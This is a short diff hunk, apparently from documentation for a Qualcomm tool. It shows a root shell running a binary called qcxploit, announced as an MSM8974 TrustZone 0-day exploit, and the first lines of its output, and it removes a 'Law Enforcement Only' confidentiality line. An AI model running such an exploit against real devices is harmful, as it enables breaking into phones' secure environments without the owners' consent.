@@ -638,7 +638,6 @@ root@bardock:/ # getprop | grep 8.1
 
         root@bacon:/ # /data/local/tmp/qcxploit exploit8974
         MSM8974 TZ 0-day exploit by B.Kerler 2017
-        Do not share, Law Enforcement Only / strictly confidential !
         ----------------------------------------------------------
         Disable NS Blacklist
         Zeroing out IMEM
